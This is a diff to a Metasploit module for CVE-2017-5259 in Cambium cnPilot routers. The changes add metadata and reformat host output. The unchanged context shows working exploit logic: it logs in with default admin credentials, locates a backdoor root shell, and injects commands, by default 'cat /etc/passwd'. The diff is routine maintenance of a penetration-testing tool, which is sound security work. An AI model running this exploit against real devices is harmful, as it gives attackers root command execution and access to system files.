@@ -24,7 +24,12 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2017-5259'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-        'License' => MSF_LICENSE
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -35,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
         OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin']),
         OptString.new('CMD', [true, 'Command(s) to run', 'cat /etc/passwd'])
-      ], self.class
+      ]
     )
 
     deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
@@ -52,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
   def cmd_exec_run(the_cookie)
     # Verify backdoor 'root' shell url exists
     root_shell = (ssl ? 'https' : 'http').to_s + '://' + "#{rhost}:#{rport}" + '/adm/syscmd.asp'
-    print_status("#{rhost}:#{rport} - Checking backdoor 'root' shell...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking backdoor 'root' shell...")
 
     res = send_request_cgi(
       {
@@ -69,8 +74,8 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.code == 200
       uri1 = '/goform/SystemCommand'
       inject_cmd = datastore['CMD']
-      print_good("#{rhost}:#{rport} - You can access the 'root' shell at: #{root_shell}")
-      print_good("#{rhost}:#{rport} - Executing command - #{inject_cmd}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - You can access the 'root' shell at: #{root_shell}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Executing command - #{inject_cmd}")
 
       send_request_cgi(
         {
@@ -120,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("File saved in: #{p}")
       end
     else
-      print_error("#{rhost}:#{rport} - Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}")
       return
     end
   end
@@ -136,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     elsif ['4.2.3-R4', '4.3.1-R1', '4.3.2-R4', '4.3.3-R4'].include?(cnpilot_version.to_s)
       cmd_exec_run(cookie)
     else
-      vprint_error("#{rhost}:#{rport} - This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.")
     end
   end
 end
